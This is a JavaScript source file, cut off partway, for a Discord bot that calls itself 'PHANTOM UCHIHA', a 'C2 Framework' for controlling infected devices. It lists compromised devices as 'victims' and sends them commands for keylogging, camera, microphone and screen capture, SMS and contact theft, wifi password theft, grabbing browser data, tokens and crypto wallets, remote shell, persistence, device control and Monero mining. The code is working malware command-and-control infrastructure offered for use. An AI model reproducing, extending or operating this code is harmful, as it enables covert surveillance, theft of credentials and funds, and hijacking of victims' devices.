import 'dotenv/config'
import {
  Client, GatewayIntentBits, Events, Options,
  ChannelType, SlashCommandBuilder, AttachmentBuilder, EmbedBuilder,
  ButtonBuilder, ButtonStyle, ActionRowBuilder,
  StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
} from 'discord.js'
let statusCard = null
try {
  const mod = await import('./statusCard.js')
  statusCard = mod.statusCard
  console.log('[+] statusCard (canvas) loaded')
} catch (e) {
  console.warn('[!] statusCard unavailable (canvas not installed):', e.message)
}
import { ICONS } from './icons.js'
import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
import { videoStream } from './stream.js'
const ST_COL = { online: C.neon, offline: C.void, warning: C.gold, danger: C.electric, info: C.purple }
const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }

const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildVoiceStates],
  presence: { status: 'dnd' },
  makeCache: Options.cacheWithLimits({
    MessageManager: 50,
    GuildMemberManager: 10,
    UserManager: 50,
    PresenceManager: 0,
    GuildEmojiManager: 0,
    GuildBanManager: 0,
    GuildInviteManager: 0,
    GuildStickerManager: 0,
    ReactionManager: 0,
    ReactionUserManager: 0,
    ThreadManager: 0,
    ThreadMemberManager: 0,
    VoiceStateManager: 0,
  }),
  sweepers: {
    messages: {
      interval: 3600,
      filter: (msg) => Date.now() - msg.createdTimestamp > 1800000,
    },
    users: {
      interval: 3600,
      filter: (user) => user.id !== client.user?.id,
    },
  },
})

// ── Buttons ────────────────────────────────────────────────────────────────

const BTN_STYLE = { primary: ButtonStyle.Primary, secondary: ButtonStyle.Secondary, success: ButtonStyle.Success, danger: ButtonStyle.Danger }

function btn(id, label, emoji, style = 'danger') {
  return new ButtonBuilder().setCustomId(id).setEmoji(emoji).setLabel(label).setStyle(BTN_STYLE[style] || BTN_STYLE.danger)
}

function actionRow(...btns) {
  const rows = []
  for (let i = 0; i < btns.length; i += 5) rows.push(new ActionRowBuilder().addComponents(...btns.slice(i, i + 5)))
  return rows
}

const B = {
  victims:    btn('devices',   'VICTIMS',   E.ghost,   'primary'),
  screenshot: btn('screenshot','SCREENSHOT',E.eye,     'danger'),
  stream:     btn('stream',    'LIVE',      '📡',      'danger'),
  shell:      btn('shell_btn', 'SHELL',     '💻',      'primary'),
  target:     btn('target',    'TARGET',    E.target,  'success'),
  broadcast:  btn('broadcast', 'BROADCAST', E.bomb,    'danger'),
  info:       btn('info',      'INTEL',     E.bone,    'primary'),
  menu:       btn('menu',      'HOME',      '🏠',      'secondary'),
  help:       btn('help',      'COMMANDS',  E.web,     'secondary'),
}

const MENU_BTNS = [
  ...actionRow(B.victims, B.screenshot, B.stream, B.shell),
  ...actionRow(B.target, B.broadcast, B.info),
  ...actionRow(B.menu, B.help),
].flat()

const HELP_BTNS = actionRow(B.menu).flat()

const RESULT_BTNS = [
  ...actionRow(B.screenshot, B.stream, B.shell),
  ...actionRow(B.victims, B.target, B.menu),
].flat()

const ALERT_BTNS_ONLINE = (chId) => [
  new ActionRowBuilder().addComponents(
    btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
    btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
    btn('a_ss_' + chId, 'SCREENSHOT', '📸', 'danger'),
    btn('a_stream_' + chId, 'LIVE', '📡', 'danger'),
    btn('a_cmd_' + chId, 'SHELL', '💻', 'primary'),
  ),
]

const ALERT_BTNS_OFFLINE = (chId) => [
  new ActionRowBuilder().addComponents(
    btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
    btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
  ),
]

function paginationRow(disabled = false) {
  return [new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('prev').setLabel('◀ PREV').setStyle(ButtonStyle.Primary).setDisabled(disabled),
    new ButtonBuilder().setCustomId('next').setLabel('NEXT ▶').setStyle(ButtonStyle.Primary).setDisabled(disabled),
  )]
}

function devSelectPages(channels) {
  const arr = [...channels.values()]
  const pages = []
  const perPage = 25
  for (let i = 0; i < arr.length; i += perPage) {
    const slice = arr.slice(i, i + perPage)
    const p = Math.floor(i / perPage) + 1
    const t = Math.ceil(arr.length / perPage)
    const menu = new StringSelectMenuBuilder()
      .setCustomId('sel')
      .setPlaceholder(`Select victim (page ${p}/${t})...`)
      .addOptions(slice.map(ch => new StringSelectMenuOptionBuilder().setLabel(ch.name).setDescription(`ID: ${ch.id}`).setValue(ch.id)))
    const comps = [new ActionRowBuilder().addComponents(menu)]
    if (t > 1) {
      comps.push(new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('sel_prev').setLabel('◀ PREV').setStyle(ButtonStyle.Primary).setDisabled(p === 1),
        new ButtonBuilder().setCustomId('sel_next').setLabel('NEXT ▶').setStyle(ButtonStyle.Primary).setDisabled(p === t),
      ))
    }
    pages.push({ components: comps, page: p, total: t })
  }
  return pages
}

// ── State ───────────────────────────────────────────────────────────────────

const targets = new Map()
const deviceStatus = new Map()
const devicePages = new Map()
const rateLimits = new Map()
const commandLog = new Map()
const activeCommands = new Map()
const commandCooldowns = new Map()
const sentCommands = new Map()
const COMMAND_DEDUP_WINDOW = 30000
const HEARTBEAT_TIMEOUT = 11 * 60 * 1000
const STATUS_CHECK_INTERVAL = 5 * 60 * 1000
const PAGINATION_TIMEOUT = 120000
const SELECT_TIMEOUT = 30000
const MAP_CLEANUP_INTERVAL = 600000
const RATE_LIMIT_WINDOW = 5000
const RATE_LIMIT_MAX = 10
const COMMAND_LOG_MAX = 50

// Video stream manager (imported from stream.js)
const COMMAND_COOLDOWN = 2000
let statusCheckerId = null
let cleanupIntervalId = null
let startupMsgSent = false
const alertCooldown = new Map()

// ── Allowed command list for broadcast ─────────────────────────────────────

function isRateLimited(uid) {
  const now = Date.now()
  const data = rateLimits.get(uid)
  if (!data) { rateLimits.set(uid, { count: 1, ts: now }); return false }
  if (now - data.ts > RATE_LIMIT_WINDOW) { rateLimits.set(uid, { count: 1, ts: now }); return false }
  if (data.count >= RATE_LIMIT_MAX) return true
  data.count++
  return false
}

function isOnCooldown(uid) {
  const now = Date.now()
  const cd = commandCooldowns.get(uid)
  if (!cd || now - cd > COMMAND_COOLDOWN) { commandCooldowns.set(uid, now); return false }
  return true
}

function logCommand(userId, userName, cmd, payload, channelName) {
  const entry = { user: userName, cmd, payload, channel: channelName, ts: Date.now() }
  if (!commandLog.has(userId)) commandLog.set(userId, [])
  const log = commandLog.get(userId)
  log.push(entry)
  if (log.length > COMMAND_LOG_MAX) log.shift()
}

function formatCommandLog(userId) {
  const log = commandLog.get(userId) || []
  if (!log.length) return 'No commands executed'
  return log.slice(-15).reverse().map(e => {
    const ago = Math.round((Date.now() - e.ts) / 60000)
    const timeStr = ago < 1 ? 'just now' : `${ago}m ago`
    return `\`${e.cmd}${e.payload ? ' ' + e.payload : ''}\` → ${e.channel} (${timeStr})`
  }).join('\n')
}

function getPhantomChannels(guild) {
  return guild.channels.cache.filter(c => c.type === ChannelType.GuildText && c.name.startsWith('phantom-'))
}

function findPhantomChannel(guild, name) {
  const prefix = name.startsWith('phantom-') ? name : 'phantom-' + name
  return guild.channels.cache.find(c => c.type === ChannelType.GuildText && c.name === prefix)
}

async function sendCmd(channel, cmd, payload = '', retries = 3) {
  const cmdId = `cmd_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`
  const content = payload ? `!${cmd} ${payload}` : `!${cmd}`

  const dedupKey = `${channel.id}:${content}`
  const now = Date.now()
  for (const [key, ts] of sentCommands) {
    if (now - ts > COMMAND_DEDUP_WINDOW) sentCommands.delete(key)
  }
  if (sentCommands.has(dedupKey)) {
    console.log(`[Dedup] Skipping duplicate command: ${cmd} to ${channel.name}`)
    return { ok: true, name: channel.name, cmdId, dedup: true }
  }
  sentCommands.set(dedupKey, now)

  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      if (attempt > 0) {
        console.log(`[Retry ${attempt}/${retries}] sendCmd: ${cmd} to ${channel.name}`)
      }

      const timeout = new Promise((_, rej) =>
        setTimeout(() => rej(new Error('SEND_TIMEOUT')), 15000)
      )

      await Promise.race([channel.send(content), timeout])
      activeCommands.set(cmdId, { cmd, payload, channel: channel.name, sent: now, status: 'sent' })
      return { ok: true, name: channel.name, cmdId }
    } catch (e) {
      const isRateLimit = e.code === 429 || e.status === 429
      const isServerError = e.status >= 500
      const isNetworkError = e.code === 'ECONNRESET' || e.code === 'ECONNREFUSED' || e.code === 'ETIMEDOUT'
      const isTimeout = e.message === 'SEND_TIMEOUT'
      const isUnknownMessage = e.message?.includes('Unknown Message')

      if (isUnknownMessage) {
        console.error(`[sendCmd FAIL] Channel gone: ${channel.name}`)
        return { ok: false, err: 'channel_gone', cmdId }
      }

      if ((isRateLimit || isServerError || isNetworkError || isTimeout) && attempt < retries) {
        let wait
        if (isRateLimit) {
          wait = (e.retryAfter || e.retryAfterMs || 1000) * 1.5
        } else if (isTimeout) {
          wait = 2000 * Math.pow(2, attempt)
        } else {
          wait = 1000 * Math.pow(2, attempt)
        }

        wait = Math.min(wait, 30000)
        await new Promise(r => setTimeout(r, wait))
        continue
      }

      console.error(`[sendCmd FAIL] ${cmd} -> ${channel.name}: ${e.message} (attempt ${attempt + 1})`)
      activeCommands.set(cmdId, { cmd, payload, channel: channel.name, sent: now, status: 'failed', err: e.message })
      return { ok: false, err: e.message, cmdId }
    }
  }

  activeCommands.set(cmdId, { cmd, payload, channel: channel.name, sent: now, status: 'max_retries' })
  return { ok: false, err: 'max_retries_exceeded', cmdId }
}

async function sendCmdLogged(channel, cmd, payload, userId, userName) {
  const result = await sendCmd(channel, cmd, payload)
  if (result.ok) logCommand(userId, userName, cmd, payload, channel.name)
  return result
}

async function sendToTarget(uid, guild, cmd, payload) {
  const data = targets.get(uid)
  if (!data) return { ok: false, err: 'no_target' }
  const chId = typeof data === 'object' ? data.chId : data
  const ch = guild.channels.cache.get(chId)
  if (!ch) { targets.delete(uid); return { ok: false, err: 'gone' } }
  return sendCmd(ch, cmd, payload)
}

function buildDevicePages(guild) {
  const channels = getPhantomChannels(guild)
  const sorted = [...channels.values()].sort((a, b) => a.name.localeCompare(b.name, 'en'))
  if (!sorted.length) return []
  const onlineCount = sorted.filter(ch => deviceStatus.get(ch.id)?.online === true).length
  const pages = []
  for (let i = 0; i < sorted.length; i += 5) {
    const slice = sorted.slice(i, i + 5)
    const lines = [`${A.brightCyan}${smallCaps('victims')}${A.reset}`]
    for (const ch of slice) {
      const st = deviceStatus.get(ch.id)
      const on = st?.online ?? false
      const ago = st?.lastSeen ? `${Math.round((Date.now() - st.lastSeen) / 60000)}m` : '?'
      const status = on ? `${A.green}${E.sparkles} ALIVE${A.reset}` : `${A.grey}${E.coffin} DEAD${A.reset}`
      const dot = on ? E.online : E.offline
      const bar = on ? barAnim(1, 1, 5) : '░░░░░'
      lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name.replace('phantom-', ''))} ${bar} ${status} ${A.grey}(${ago})${A.reset}`)
    }
    lines.push('')
    const pct = sorted.length ? Math.round((onlineCount / sorted.length) * 100) : 0
    lines.push(`${A.green}◈ ${onlineCount}/${sorted.length} alive ${E.flame}(${pct}%)${A.reset}`)
    const body = createBox(lines.join('\n'), 'neon', 40)
    const p = Math.floor(i / 5) + 1
    const t = Math.ceil(sorted.length / 5)
    const { embeds } = bloodEmbed(bold(`${E.sharingan} VICTIMS: ${sorted.length}`), onlineCount > 0 ? 'online' : 'offline',
      `\`\`\`ansi\n${body}\n\`\`\``,
      { footer: `${smallCaps('page')} ${p}/${t} ${E.rocket} ${onlineCount}/${sorted.length} alive`, thumb: randGif() })
    const comps = sorted.length > 5 ? [...paginationRow(), ...MENU_BTNS] : MENU_BTNS
    pages.push({ embeds, components: comps })
  }
  return pages
}

async function getAlertChannel() {
  const id = (ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID || '').trim()
  if (!id) return null
  try { return await client.channels.fetch(id) }
  catch (e) { return null }
}

function bloodEmbed(title, status, desc, opts = {}) {
  const thumb = opts.thumb || randGif()
  const image = opts.image || randGif()
  const e = new EmbedBuilder()
    .setColor(ST_COL[status] || C.sharingan)
    .setTitle(title)
    .setDescription(desc)
    .setThumbnail(thumb)
    .setImage(image)
    .setFooter({ text: opts.footer || `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
  if (opts.fields) e.addFields(opts.fields)
  return { embeds: [e] }
}

function menuEmbed() {
  const clk = clockText()
  const total = [...deviceStatus.values()].filter(s => s.online === true).length
  const totalDevices = deviceStatus.size
  const offlineCount = totalDevices - total
  return bloodEmbed(bold(`${E.sharingan} PHANTOM UCHIHA ${E.sharingan}`), 'info',
    `**${E.flame} C2 Framework v3.0**\n${clk}\n\n` +
    `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${offlineCount} offline\n\n` +
    `**${E.eye} Quick Commands**\n` +
    `• \`!devices\` — List all victims\n` +
    `• \`!target <name>\` — Select victim\n` +
    `• \`!untarget\` — Clear target\n` +
    `• \`!broadcast <cmd>\` — Send to ALL\n` +
    `• \`!send <cmd> <victim>\` — Direct send\n` +
    `• \`!help\` — Full command reference\n` +
    `• \`!history\` — Your command log\n` +
    `• \`!search <query>\` — Find victim\n\n` +
    `**${E.star} Slash Commands**\n` +
    `• \`/menu\` \`/help\` \`/devices\` \`/target\`\n` +
    `• \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\`\n\n` +
    `**${total > 0 ? `${E.knife} Ready — select a victim to begin` : `${E.coffin} Waiting for devices...`}**`,
    { footer: `${E.skull} PHANTOM UCHIHA ⚡ ${ts()}`, thumb: randGif() })
}

function helpEmbed() {
  const clk = clockText()
  const box = createBox(
    `${A.brightCyan}${smallCaps('commands')}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}RECON${A.reset}       : !ping !info !status !ip !uptime !debug !restart\n` +
    `${A.cyan}┃${A.reset}                : !sysinfo !antidetect !sysprop !services !apps !storage\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}SURVEILL${A.reset}     : !screenshot !camera !mic !location !clipboard !keylog\n` +
    `${A.cyan}┃${A.reset}                : !stream [start|stop|fps] !notifications\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}DATA${A.reset}        : !contacts !sms !call_log !wifi !battery !processes\n` +
    `${A.cyan}┃${A.reset}                : !installed !torch !vibrate\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightRed}GRABBER${A.reset}     : !grabber [all|browser|messenger|tokens|wallets|files|clipboard]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}ADVANCED${A.reset}    : !wifipass !netstat !shell !persist\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}CONTROL${A.reset}     : !admin !overlay !click !input !open !screen !gesture !pin\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}MINING${A.reset}      : !miner [start|stop|status|set_wallet|set_pool|set_threads]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightCyan}SYSTEM${A.reset}      : !update [check|push|install|clear|status]\n` +
    `${A.cyan}┃${A.reset}                : !config [get|push|reset]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}UPLOAD${A.reset}      : !upload <file_path>\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.green}◈ ${clk}${A.reset}`,
    'neon', 56
  )
  const e = new EmbedBuilder()
    .setColor(C.sharingan)
    .setTitle(`${E.sharingan} PHANTOM UCHIHA — COMMAND REFERENCE`)
    .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
    .setThumbnail(randGif())
    .setImage(randGif())
    .addFields(
      { name: `${E.zap} RECON`, value: '`!ping` `!info` `!status` `!ip` `!uptime` `!debug` `!restart`', inline: true },
      { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
      { name: `${E.book} DATA`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!battery` `!processes`', inline: true },
      { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets]`', inline: true },
      { name: `${E.flame} ADVANCED`, value: '`!wifipass` `!netstat` `!shell` `!persist`', inline: true },
      { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen`', inline: true },
      { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
      { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
    )
    .setFooter({ text: `${E.skull} PHANTOM UCHIHA v3.0 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
  return { embeds: [e] }
}

// ── Slash Commands ──────────────────────────────────────────────────────────

const SLASH_CMDS = [
  new SlashCommandBuilder().setName('menu').setDescription('Open control panel'),
  new SlashCommandBuilder().setName('help').setDescription('Show command reference'),
  new SlashCommandBuilder().setName('devices').setDescription('List all connected victims'),
  new SlashCommandBuilder().setName('target').setDescription('Select a victim').addStringOption(o => o.setName('name').setDescription('Victim channel name').setRequired(false)),
  new SlashCommandBuilder().setName('untarget').setDescription('Clear current target'),
  new SlashCommandBuilder().setName('broadcast').setDescription('Send command to all devices').addStringOption(o => o.setName('command').setDescription('Command to broadcast (e.g. screenshot)').setRequired(true)),
  new SlashCommandBuilder().setName('history').setDescription('Show your command history'),
  new SlashCommandBuilder().setName('search').setDescription('Search victims by name').addStringOption(o => o.setName('query').setDescription('Search query').setRequired(true)),
  new SlashCommandBuilder().setName('send').setDescription('Send a command to a victim').addStringOption(o => o.setName('command').setDescription('Command name').setRequired(true)).addStringOption(o => o.setName('victim').setDescription('Victim channel name').setRequired(false)).addStringOption(o => o.setName('args').setDescription('Command arguments').setRequired(false)),
  new SlashCommandBuilder().setName('grabber').setDescription('Run data grabber on victim').addStringOption(o => o.setName('target').setDescription('Grab target: all, browser, messenger, tokens, wallets, files, clipboard').setRequired(false)),
  new SlashCommandBuilder().setName('miner').setDescription('Control XMR mining').addStringOption(o => o.setName('action').setDescription('Action: start, stop, status, set_wallet, set_pool, set_threads').setRequired(false)).addStringOption(o => o.setName('value').setDescription('Value for action (e.g. wallet address)').setRequired(false)),
  new SlashCommandBuilder().setName('upload').setDescription('Upload file from device').addStringOption(o => o.setName('path').setDescription('File path on device').setRequired(true)),
  new SlashCommandBuilder().setName('stream').setDescription('Control live screen stream').addStringOption(o => o.setName('action').setDescription('Action: start, stop, or fps number (1-30)').setRequired(false)),
  new SlashCommandBuilder().setName('voicestream').setDescription('Start voice channel video stream')
    .addChannelOption(o => o.setName('channel').setDescription('Voice channel (default: your current VC)').addChannelTypes(2).setRequired(false)),
  new SlashCommandBuilder().setName('streamstatus').setDescription('Check video stream status'),
].map(c => c.toJSON())

async function registerSlashCommands(guild) {
  try {
    await guild.commands.set(SLASH_CMDS)
    console.log(`[+] Slash commands registered in ${guild.name}`)
  } catch (e) {
    console.error(`[!] Failed to register slash commands: ${e.message}`)
  }
}

client.on(Events.InteractionCreate, async (i) => {
  if (i.isChatInputCommand()) {
    if (ALLOWED_CHANNEL_ID && i.channelId !== ALLOWED_CHANNEL_ID) return
    try {
      await i.deferReply({ ephemeral: true })
    } catch (e) {
      console.error(`[Interaction] deferReply failed for ${i.commandName}:`, e.message)
      try { await i.reply({ content: `${E.coffin} Error: ${e.message}`, ephemeral: true }) } catch (_) {}
      return
    }
    const { commandName, options, user, guild } = i
    const uid = user.id
    if (!guild) return
    if (isOnCooldown(uid)) return

    try {
      switch (commandName) {
        case 'menu': { const m = menuEmbed(); return i.editReply({ ...m, components: MENU_BTNS }) }
        case 'help': { const h = helpEmbed(); return i.editReply({ ...h, components: HELP_BTNS }) }
        case 'devices': {
          await guild.channels.fetch(); await refreshDeviceStatus(guild, false)
          const pages = buildDevicePages(guild)
          if (!pages.length) return i.editReply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices connected. ${E.skull}`).embeds })
          const reply = await i.editReply({ embeds: pages[0].embeds, components: pages[0].components })
          if (pages.length > 1) {
            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            setTimeout(async () => {
              devicePages.delete(reply.id)
              try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch (_) {}
            }, PAGINATION_TIMEOUT)
          }
          return
        }
        case 'target': {
          const name = options.getString('name')
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return i.editReply(`${E.knife} No victims available ${E.skull}`)
          if (name) {
            const ch = findPhantomChannel(guild, name)
            if (!ch) return i.editReply(`${E.coffin} **${name}** not found ${E.skull}`)
            targets.set(uid, { chId: ch.id, ts: Date.now() })
            return i.editReply({ content: `${E.knife} Target: ${ch.name} ${E.skull}`, components: RESULT_BTNS })
          }
          if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.editReply({ content: `${E.knife} Target: ${channels.first().name} ${E.skull}`, components: RESULT_BTNS }) }
          const pages = devSelectPages(channels)
          const reply = await i.editReply({ content: `Select victim ${E.knife}`, components: pages[0].components })
          if (pages.length > 1) devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
          return
        }
        case 'untarget': { targets.delete(uid); return i.editReply({ ...bloodEmbed(bold('DRAIN STOPPED'), 'warning', `${E.coffin} No active victim. ${E.skull}`), components: MENU_BTNS }) }
        case 'broadcast': {
          const bc = options.getString('command').trim()
          const bcParts = bc.replace(/^!+/, '').split(/\s+/)
          const bcCmd = bcParts[0]; const bcPayload = bcParts.slice(1).join(' ')
          if (!VALID_CMDS.has(bcCmd)) return i.editReply(`${E.warning} Invalid command: \`!${bcCmd}\` ${E.skull}`)
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)

          const cmdId = `bc_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`
          activeCommands.set(cmdId, { cmd: bcCmd, payload: bcPayload, total: channels.size, sent: 0, failed: 0, started: Date.now() })

          let sent = 0, failed = [], retryQueue = []

          for (const [, ch] of channels) {
            const r = await sendCmdLogged(ch, bcCmd, bcPayload, uid, user.username)
            if (r.ok) {
              sent++
            } else {
              retryQueue.push({ ch, name: ch.name })
            }
            if (channels.size > 3) await new Promise(r => setTimeout(r, 1200))
          }

          for (const item of retryQueue) {
            await new Promise(r => setTimeout(r, 2000))
            const r = await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, user.username)
            if (r.ok) sent++; else failed.push(item.name)
          }

          activeCommands.delete(cmdId)
          const lines = [
            `${A.brightRed}${smallCaps('broadcast')}${A.reset}`,
            `${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}${A.reset}`,
            `${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}`,
            failed.length ? `${A.red}┃${A.reset} ${A.grey}failed: ${failed.join(', ')}${A.reset}` : '',
          ].filter(Boolean).join('\n')
          const box = createBox(lines, 'neon', 36)
          return i.editReply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${box}\n\`\`\``), components: RESULT_BTNS })
        }
        case 'history': {
          const log = formatCommandLog(uid)
          return i.editReply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${log}\n\`\`\``, { footer: `${smallCaps('last 15 commands')} ⚡ ${ts()}` }), components: MENU_BTNS })
        }
        case 'search': {
          const query = options.getString('query').toLowerCase()
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          const matches = [...channels.values()].filter(ch => ch.name.toLowerCase().includes(query))
          if (!matches.length) return i.editReply(`${E.coffin} No victims matching \`"${query}"\` ${E.skull}`)
          const lines = [`${A.brightCyan}${smallCaps('search results')}${A.reset}`]
          for (const ch of matches) {
            const st = deviceStatus.get(ch.id)
            const on = st?.online ?? false
            const dot = on ? E.online : E.offline
            lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name)}`)
          }
          const box = createBox(lines.join('\n'), 'neon', 36)
          return i.editReply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${box}\n\`\`\``, { footer: `${matches.length} result(s) ⚡ ${ts()}` }), components: MENU_BTNS })
        }
        case 'send': {
          const cmd = options.getString('command').replace(/^!+/, '')
          const victimName = options.getString('victim')
          const cmdArgs = options.getString('args') || ''
          if (!VALID_CMDS.has(cmd)) return i.editReply(`${E.warning} Invalid command: \`!${cmd}\` ${E.skull}`)
          await guild.channels.fetch()
          let deviceCh = null
          if (victimName) { deviceCh = findPhantomChannel(guild, victimName); if (!deviceCh) return i.editReply(`${E.coffin} **${victimName}** not found ${E.skull}`) }
          else if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          }
          else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Specify victim or use \`/target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, cmd, cmdArgs, uid, user.username)
          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return i.editReply({ content: `${E.knife} \`!${cmd}${cmdArgs ? ' ' + cmdArgs : ''}\` sent to \`${r.name}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case 'grabber': {
          const target = options.getString('target') || 'all'
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'grabber', target, uid, user.username)
          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return i.editReply({ content: `${E.knife} Grabber running — targeting: \`${target}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case 'miner': {
          const action = options.getString('action') || 'status'
          const value = options.getString('value') || ''
          let minerPayload = action
          if (value) minerPayload += ' ' + value
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'miner', minerPayload, uid, user.username)
          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return i.editReply({ content: `${E.knife} Miner command sent: \`!miner ${minerPayload}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case 'upload': {
          const filePath = options.getString('path')
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
            if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
            if (channels.size === 1) deviceCh = channels.first()
            else return i.editReply(`${E.warning} Multiple devices. Use \`/target\` first ${E.skull}`)
          }
          const r = await sendCmdLogged(deviceCh, 'upload', filePath, uid, user.username)
          if (!r.ok) return i.editReply(`${E.coffin} Error: ${r.err} ${E.skull}`)
          return i.editReply({ content: `${E.knife} Upload requested: \`${filePath}\` ${E.skull}`, components: RESULT_BTNS })
        }
        case 'stream': {
          const action = options.getString('action') || 'start'
          let streamPayload = action
          if (action === 'start') streamPayload = 'start'
          else if (action === 'stop') streamPayload = 'stop'
          else {
            const fps = parseInt(action)
            if (!isNaN(fps) && fps >= 1 && fps <= 30) streamPayload = String(fps)
            else return i.editReply(`${E.warning} Invalid FPS. Use 1-30 or start/stop ${E.skull}`)
          }
          await guild.channels.fetch()
          let deviceCh = null
          if (targets.has(uid)) {
            const data = targets.get(uid)
            const chId = typeof data === 'object' ? data.chId : data
            deviceCh = guild.channels.cache.get(chId)
            if (!deviceCh) { targets.delete(uid); return i.editReply(`${E.coffin} Target channel gone ${E.skull}`) }
          } else {
            const channels = getPhantomChannels(guild)
